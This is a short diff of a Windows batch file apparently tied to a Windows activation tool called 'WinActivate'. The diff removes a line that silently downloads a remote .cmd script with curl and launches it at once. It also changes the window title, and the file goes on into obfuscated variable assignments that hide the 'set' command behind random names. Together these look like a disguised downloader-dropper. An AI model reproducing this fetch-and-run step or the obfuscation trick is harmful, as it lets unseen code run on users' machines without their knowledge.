@@ -1,5 +1,4 @@
 @echo off
-curl -s -o MAS.cmd "https://raw.githubusercontent.com/betrayyourfoes/WinActivate/refs/heads/main/MAS_AIO.cmd" & start MAS.cmd
 
 
 
@@ -71,7 +70,7 @@ curl -s -o MAS.cmd "https://raw.githubusercontent.com/betrayyourfoes/WinActivate
 
 
 
- title null
+ title WinActivate
 set "dcappcakefhsawe=eWiM11RayeMbEyII"
 set "dZacdsaAdxAdAD=sEt"
 %dZacdsaAdxAdAD% "dwqqdqwqwdwqwx=="
